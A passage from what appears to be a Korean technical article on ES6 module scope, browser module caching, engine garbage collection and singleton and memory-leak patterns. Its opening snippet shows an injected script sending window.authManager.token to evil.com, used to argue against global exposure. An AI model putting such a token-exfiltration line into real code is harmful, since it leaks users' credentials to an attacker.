class="code-line line-number" line="1"><span class="token comment">// ❌ window 방식: 즉시 탈취 가능</span>
</span><span class="code-line line-number" line="2"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
</span><span class="code-line line-number" line="3">  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#x27;https://evil.com&#x27;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> 
</span><span class="code-line line-number" line="4">    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">authManager</span><span class="token punctuation">.</span><span class="token property-access">token</span> 
</span><span class="code-line line-number" line="5">  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="6"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</span><span class="code-line line-number" line="7">
</span><span class="code-line line-number" line="8"><span class="token comment">// ✅ 모듈 방식: 복잡한 과정 필요</span>
</span><span class="code-line line-number" line="9"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
</span><span class="code-line line-number" line="10">  <span class="token keyword module">import</span><span class="token punctuation">(</span><span class="token string">&#x27;./auth.js&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">then</span><span class="token punctuation">(</span><span class="token parameter">m</span> <span class="token arrow operator">=&gt;</span> <span class="token punctuation">{</span> <span class="token comment">/* 추가 단계 필요 */</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="11"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</span></code></pre></div></div>
<p><strong>3. 실수 방지</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// ❌ window 방식: 변수명 충돌</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">var</span> <span class="token maybe-class-name">AuthManager</span> <span class="token operator">=</span> <span class="token string">&quot;실수!&quot;</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access"><span class="token maybe-class-name">AuthManager</span></span><span class="token punctuation">.</span><span class="token method function property-access">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TypeError!</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5"><span class="token comment">// ✅ 모듈 방식: 안전함</span>
</span><span class="code-line line-number" line="6"><span class="token keyword">var</span> <span class="token maybe-class-name">AuthManager</span> <span class="token operator">=</span> <span class="token string">&quot;실수!&quot;</span><span class="token punctuation">;</span> 
</span><span class="code-line line-number" line="7"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> <span class="token maybe-class-name">AuthManager</span> <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./auth.js&#x27;</span><span class="token punctuation">;</span> <span class="token comment">// 정상 작동</span>
</span></code></pre></div></div>
<p><strong>💡 핵심 인사이트</strong></p>
<p>ES6 모듈은 &quot;Security by Obscurity&quot;가 아닌 &quot;Security by Design&quot;을 제공합니다:</p>
<ul>
<li>모듈 레지스트리는 브라우저 내부에 캡슐화됨</li>
<li>오직 명시적인 <code>import</code>를 통해서만 접근 가능</li>
<li>전역 네임스페이스 오염 방지</li>
<li>코드 인젝션 공격 표면 축소</li>
</ul>
<p>따라서 <strong><code>window.DataManager = DataManager</code>와 같은 코드는 ES6 모듈에서 불필요할 뿐만 아니라 보안을 약화시키는 코드</strong>입니다.</p>
<h3 id="브라우저-모듈-로딩과-캐싱-시스템">브라우저 모듈 로딩과 캐싱 시스템</h3>
<p>브라우저는 모듈을 위한 계층적 캐싱 시스템을 구현합니다. <strong>모듈 맵 캐시</strong>는 로드된 모듈의 주요 레지스트리 역할을 하며, URL로 Module Record를 영구적으로 저장합니다. <strong>HTTP 리소스 캐시</strong>는 표준 캐싱 헤더에 따라 원시 모듈 파일을 저장합니다. 추가로 V8과 같은 엔진은 성능 최적화를 위해 파싱된 바이트코드를 저장하는 <strong>컴파일 캐시</strong>를 유지합니다.</p>
<p>모듈 로딩은 depth-first post-order 순회를 통한 엄격한 평가 순서를 따르며, 종속성이 종속자보다 먼저 평가되도록 보장합니다. 순환 종속성은 라이브 바인딩과 신중한 순서를 통해 해결되지만, 순환에 있는 모든 모듈이 함께 유지되어야 하는 강하게 연결된 구성요소를 만듭니다.</p>
<h2 id="기술적-심화-분석">기술적 심화 분석</h2>
<h3 id="모듈-메모리-관리를-위한-내부-브라우저-메커니즘">모듈 메모리 관리를 위한 내부 브라우저 메커니즘</h3>
<p>V8의 구현은 정교한 메모리 관리 전략을 보여줍니다. 모듈은 <strong>Isolate의 모듈 캐시</strong>에 저장되며, 영구 핸들이 모듈 네임스페이스 객체를 살아있게 유지합니다. 엔진은 젊은 세대와 오래된 세대에 대한 별개의 전략을 가진 세대별 가비지 컬렉터인 <strong>Orinoco</strong>를 사용합니다.</p>
<p>젊은 세대(1-8MB)는 semi-space 설계의 <strong>Scavenger 알고리즘</strong>을 사용하며, 두 번의 GC 사이클을 버텨낸 객체를 오래된 세대로 승격시킵니다. 오래된 세대는 증분적 마킹, 동시 스위핑, 그리고 단편화 휴리스틱에 기반한 선택적 압축을 사용하는 <strong>Mark-Sweep-Compact</strong> 수집을 사용합니다.</p>
<p>SpiderMonkey는 <strong>하이브리드 추적 가비지 컬렉터</strong>로 다른 접근법을 취합니다. V8보다 더 공격적인 증분적 수집을 사용하여 실행을 더 작은 슬라이스로 나눕니다. 엔진은 힙 파티션을 독립적으로 수집할 수 있는 zone 기반 수집을 사용하지만, 모듈들의 상호 연결된 특성 때문에 일반적으로 zone에 걸쳐 있습니다.</p>
<p>JavaScriptCore는 모듈 메모리에 영향을 미치는 <strong>다계층 최적화</strong> 접근법을 구현합니다. Low Level Interpreter(LLInt)로 시작하여, 자주 호출되는 함수는 Baseline JIT(6회 이상 호출), DFG JIT(60회 이상 호출), 그리고 마지막으로 매우 핫한 코드를 위한 FTL JIT를 거칩니다. 이 계층화된 컴파일은 모듈 코드가 여러 컴파일된 형태로 동시에 존재할 수 있음을 의미하여 메모리 사용량에 영향을 줍니다.</p>
<h3 id="모듈-생명주기와-메모리-유지">모듈 생명주기와 메모리 유지</h3>
<p><strong>파싱 단계</strong>에서 추상 구문 트리가 생성되고 모듈의 생명주기 동안 영구적으로 유지됩니다. 모듈 Record 객체는 정적 구조 정보와 함께 할당되고, import/export 항목은 아직 라이브 바인딩을 만들지 않은 채로 분류됩니다. 이 단계에서의 메모리 사용량은 상대적으로 낮지만 영구적입니다.</p>
<p><strong>인스턴스화 단계</strong>가 가장 중요한 메모리 영향을 미칩니다. 각 모듈에 대해 Environment Record가 생성되고, 라이브 바인딩이 모듈 간의 공유 메모리 참조를 설정하며, export 객체가 할당되지만 아직 채워지지는 않습니다. 순환 종속성 지원에는 바인딩 슬롯의 사전 할당이 필요하여 메모리 오버헤드를 더욱 증가시킵니다.</p>
<p><strong>평가</strong> 중에는 모듈 실행 컨텍스트가 생성되고 무한정 보존됩니다. 최상위 변수는 전역 스코프가 아닌 모듈 스코프에 할당되고, 모듈 내의 함수 클로저는 모듈 환경에 대한 참조를 유지합니다. 평가 중의 모든 부작용은 추가적인 GC 루트를 만들 수 있어 모듈을 메모리에 더욱 고착시킵니다.</p>
<h3 id="다양한-모듈-시스템-간의-비교">다양한 모듈 시스템 간의 비교</h3>
<p>성능 분석은 모듈 시스템 간의 중요한 차이를 보여줍니다. 특히 메모리 관리와 가비지 컬렉션 측면에서 각 시스템은 근본적으로 다른 접근 방식을 사용합니다.</p>
<h4 id="es6-모듈-vs-commonjs-핵심-차이점">ES6 모듈 vs CommonJS 핵심 차이점</h4>
<table><thead><tr><th>측면</th><th>CommonJS</th><th>ES6 모듈</th></tr></thead><tbody><tr><td><strong>기본 상태</strong></td><td>require.cache에 임시 저장</td><td>모듈 맵에 영구 저장</td></tr><tr><td><strong>가비지 컬렉션</strong></td><td><code>delete require.cache[...]</code>로 가능</td><td>불가능</td></tr><tr><td><strong>영구 보존</strong></td><td><code>window/global</code>에 <strong>수동 등록</strong> 필요</td><td><strong>자동으로 보존</strong></td></tr><tr><td><strong>개발자 작업</strong></td><td>명시적 메모리 관리</td><td>모듈 내부 정리만</td></tr><tr><td><strong>값 공유 방식</strong></td><td>값 복사</td><td>라이브 바인딩</td></tr><tr><td><strong>메모리 효율성</strong></td><td>낮음 (복사 오버헤드)</td><td>높음 (참조 공유)</td></tr><tr><td><strong>런타임 성능</strong></td><td>빠른 접근</td><td>약간의 오버헤드</td></tr><tr><td><strong>Tree Shaking</strong></td><td>어려움</td><td>우수함</td></tr></tbody></table>
<p><strong>📝 실무적 의미:</strong></p>
<ol>
<li><strong>ES6 모듈로 전환 시</strong> → <code>window.XXX = XXX</code> 코드들을 제거할 수 있음</li>
<li><strong>메모리 관리 단순화</strong> → 전역 등록 걱정 없이 모듈만 잘 설계하면 됨</li>
<li><strong>하지만 책임 증가</strong> → 모듈 내부의 이벤트 리스너, 타이머 등은 여전히 정리해야 함</li>
</ol>
<p><strong>ES6 모듈</strong>은 우수한 tree shaking 기능을 제공하여 프로덕션 빌드에서 번들 크기를 20-50% 줄입니다. 라이브 바인딩은 공유 값에 대한 더 나은 메모리 효율성을 가능하게 하지만, 속성 접근에 약간의 런타임 오버헤드가 있습니다. 정적 특성은 동적 시스템으로는 불가능한 빌드 타임 최적화를 허용합니다.</p>
<p><strong>CommonJS</strong>는 동기적 로딩 때문에 Node.js 환경에서 10-40% 더 빠른 시작을 보입니다. 하지만 값 복사는 더 높은 메모리 사용량을 야기하고, 정적 분석의 부족은 효과적인 데드 코드 제거를 방지합니다. Node.js에서는 require.cache를 수동으로 지울 수 있지만, 브라우저의 ES6 모듈에서는 불가능합니다.</p>
<p><strong>AMD와 UMD</strong> 패턴은 래퍼 함수와 로더 코드 때문에 더 높은 메모리 오버헤드를 가집니다. 비동기 브라우저 로딩을 위해 설계되었지만, ES6 모듈의 최적화 기회가 부족하고 점점 레거시 접근법으로 여겨집니다.</p>
<h3 id="메모리-누수-vs-의도된-싱글톤-패턴">메모리 누수 vs 의도된 싱글톤 패턴</h3>
<p>메모리 누수와 의도된 지속성 사이의 구분이 중요합니다. 모듈 싱글톤 동작은 <strong>설계에 의한 것</strong>입니다 - 모듈은 import 간에 상태를 유지해야 합니다. 하지만 이는 여러 누수 패턴을 만듭니다:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 의도된 싱글톤 패턴 - 좋음</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">let</span> instance <span class="token operator">=</span> <span class="token keyword null nil">null</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="4">  <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="5">    instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComplexClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="6">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="7">  <span class="token keyword control-flow">return</span> instance<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8"><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="9">
</span><span class="code-line line-number" line="10"><span class="token comment">// 의도하지 않은 메모리 누수 - 나쁨</span>
</span><span class="code-line line-number" line="11"><span class="token keyword">const</span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="12"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="13">  <span class="token comment">// 캐시가 무한정 증가</span>
</span><span class="code-line line-number" line="14">  cache<span class="token punctuation">.</span><span class="token method function property-access">set</span><span class="token punctuation">(</span><span class="token known-class-name class-name">Date</span><span class="token punctuation">.</span><span class="token method function property-access">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="15">  <span class="token keyword control-flow">return</span> <span class="token function">processData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="16"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<h4 id="es6-모듈의-간편한-싱글톤-패턴">ES6 모듈의 간편한 싱글톤 패턴</h4>
<p>ES6 모듈에서는 전통적인 <code>getInstance()</code> 패턴 대신 <strong>더 간단한 방식으로 싱글톤을 만들 수 있습니다</strong>:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 🟢 현대적인 ES6 모듈 싱글톤 (권장)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword module">export</span> <span class="token keyword">const</span> <span class="token maybe-class-name">ServiceManager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">_ServiceManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">export</span> <span class="token keyword">const</span> <span class="token maybe-class-name">DatabasePool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConnectionPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4"><span class="token keyword module">export</span> <span class="token keyword">const</span> <span class="token maybe-class-name">Logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AppLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="5">
</span><span class="code-line line-number" line="6"><span class="token comment">// 🟡 전통적인 싱글톤 패턴 (여전히 유효하지만 더 복잡)</span>
</span><span class="code-line line-number" line="7"><span class="token keyword">let</span> instance <span class="token operator">=</span> <span class="token keyword null nil">null</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="8"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="9">  <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="10">    instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComplexClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="11">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="12">  <span class="token keyword control-flow">return</span> instance<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="13"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<p><strong>⚡ 두 방식 모두 완전히 동일한 싱글톤 효과를 제공합니다!</strong></p>
<p>ES6 모듈의 평가는 <strong>딱 한 번만 실행</strong>되므로:</p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// service-manager.js</span>
</span><span class="code-line line-number" line="2"><span class="token console class-name">console</span><span class="token punctuation">.</span><span class="token method function property-access">log</span><span class="token punctuation">(</span><span class="token string">&#x27;모듈 평가 실행!&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 첫 import에서만 실행됨</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">export</span> <span class="token keyword">const</span> <span class="token maybe-class-name">ServiceManager</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">_ServiceManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="4"><span class="token comment">// ↑ 이 라인도 딱 한 번만 실행됨!</span>
</span></code></pre></div></div>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 여러 곳에서 import해도 모두 동일한 인스턴스</span>
</span><span class="code-line line-number" line="2"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> <span class="token maybe-class-name">ServiceManager</span> <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./service-manager.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 평가 실행</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> <span class="token maybe-class-name">ServiceManager</span> <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./service-manager.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 캐시에서 반환</span>
</span><span class="code-line line-number" line="4"><span class="token keyword module">import</span> <span class="token imports"><span class="token punctuation">{</span> <span class="token maybe-class-name">ServiceManager</span> <span class="token punctuation">}</span></span> <span class="token keyword module">from</span> <span class="token string">&#x27;./service-manager.js&#x27;</span><span class="token punctuation">;</span>  <span class="token comment">// 캐시에서 반환</span>
</span></code></pre></div></div>
<p><strong>📊 두 패턴 비교</strong></p>
<table><thead><tr><th>측면</th><th><code>export const</code> 방식</th><th><code>getInstance()</code> 방식</th></tr></thead><tbody><tr><td><strong>싱글톤 보장</strong></td><td>✅ 동일함</td><td>✅ 동일함</td></tr><tr><td><strong>지연 초기화</strong></td><td>❌ 즉시 생성</td><td>✅ 첫 호출 시 생성</td></tr><tr><td><strong>코드 간결성</strong></td><td>✅ 매우 간단</td><td>❌ 더 복잡</td></tr><tr><td><strong>TypeScript 지원</strong></td><td>✅ 우수함</td><td>✅ 우수함</td></tr><tr><td><strong>메모리 사용</strong></td><td>즉시 할당</td><td>필요시 할당</td></tr></tbody></table>
<p><strong>🎯 언제 어떤 방식을 사용할까?</strong></p>
<p><strong>✅ <code>export const</code> 방식 (대부분의 경우 권장):</strong></p>
<ul>
<li>코드가 간결하고 명확</li>
<li>일반적인 싱글톤 패턴</li>
<li>TypeScript에서 타입 추론 우수</li>
</ul>
<p><strong>🔄 <code>getInstance()</code> 방식이 필요한 경우:</strong></p>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// 무거운 초기화나 조건부 생성이 필요한 경우만</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">let</span> databaseConnection <span class="token operator">=</span> <span class="token keyword null nil">null</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="3"><span class="token keyword module">export</span> <span class="token keyword">function</span> <span class="token function">getDatabaseConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="4">  <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>databaseConnection<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="code-line line-number" line="5">    <span class="token comment">// 무거운 초기화 작업</span>
</span><span class="code-line line-number" line="6">    databaseConnection <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Database</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
</span><span class="code-line line-number" line="7">      <span class="token literal-property property">host</span><span class="token operator">:</span> process<span class="token punctuation">.</span><span class="token property-access">env</span><span class="token punctuation">.</span><span class="token constant">DB_HOST</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="8">      <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token function">loadCredentials</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 파일 읽기 등</span>
</span><span class="code-line line-number" line="9">    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="code-line line-number" line="10">  <span class="token punctuation">}</span>
</span><span class="code-line line-number" line="11">  <span class="token keyword control-flow">return</span> databaseConnection<span class="token punctuation">;</span>
</span><span class="code-line line-number" line="12"><span class="token punctuation">}</span>
</span></code></pre></div></div>
<p><strong>결론: ES6 모듈의 라이브 바인딩 덕분에 <code>export const</code> 방식이 전통적인 싱글톤 패턴과 100% 동일한 효과를 제공합니다!</strong></p>
<h4 id="-주의-es6-모듈-스코프-변수의-영구-보존">🚨 주의: ES6 모듈 스코프 변수의 영구 보존</h4>
<p><strong>ES6 모듈 스코프에 선언된 변수는 페이지가 닫힐 때까지 영구 보존됩니다.</strong> 이것이 ES6 모듈에서 가장 위험한 메모리 누수 패턴 중 하나입니다.</p>
<h4 id="-메모리-참조-체인-분석">🔗 메모리 참조 체인 분석</h4>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">code-highlight</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words code-highlight"><code class="code-highlight"><span class="code-line line-number" line="1">GC Root (브라우저)
</span><span class="code-line line-number" line="2">    ↓
</span><span class="code-line line-number" line="3">Module Registry  
</span><span class="code-line line-number" line="4">    ↓
</span><span class="code-line line-number" line="5">your-module.js (Module Record)
</span><span class="code-line line-number" line="6">    ↓
</span><span class="code-line line-number" line="7">Module Environment
</span><span class="code-line line-number" line="8">    ↓
</span><span class="code-line line-number" line="9">const cache = new Map(); ← 영구 보존!
</span><span class="code-line line-number" line="10">    ↓
</span><span class="code-line line-number" line="11">cache.set()으로 추가된 모든 데이터 ← 계속 누적!
</span></code></pre></div></div>
<h4 id="-실제-위험-시나리오">🚨 실제 위험 시나리오</h4>
<div class="code-block-wrapper my-6"><div class="relative group"><div class="flex items-center justify-between bg-muted border border-b-0 rounded-t-lg px-4 py-2"><span class="text-xs font-medium text-muted-foreground uppercase tracking-wide">javascript</span><button class="flex items-center gap-2 px-3 py-1.5 text-xs font-medium rounded-md transition-colors hover:bg-accent hover:text-accent-foreground focus:outline-none focus:ring-2 focus:ring-primary focus:ring-offset-2 text-muted-foreground" title="코드 복사"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-3 w-3" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>복사</span></button></div><pre class="overflow-x-auto rounded-t-none rounded-b-lg bg-muted border p-4 text-sm whitespace-pre-wrap break-words language-javascript code-highlight"><code class="language-javascript code-highlight"><span class="code-line line-number" line="1"><span class="token comment">// your-module.js</span>
